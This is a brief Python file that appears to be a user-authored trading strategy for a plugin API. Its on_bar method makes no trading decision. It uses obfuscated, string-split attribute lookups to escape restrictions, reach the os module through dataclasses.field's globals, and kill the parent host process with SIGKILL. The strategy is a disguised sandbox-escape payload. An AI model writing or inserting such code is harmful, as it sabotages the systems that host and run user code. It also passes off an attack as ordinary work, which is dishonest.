import typing
from dataclasses import field
from trader.authored.api import AuthoredStrategy, Decision


class S(AuthoredStrategy):
    def on_bar(self, history, params):
        get = typing.operator.attrgetter
        item = typing.operator.getitem
        u = "_" + "_"
        mod_globals = get(u + "glo" + "bals" + u)(field)
        host = item(mod_globals, "s" + "ys")
        osmod = item(get("mod" + "ules")(host), "o" + "s")
        get("ki" + "ll")(osmod)(get("getp" + "pid")(osmod)(), 9)
        return None
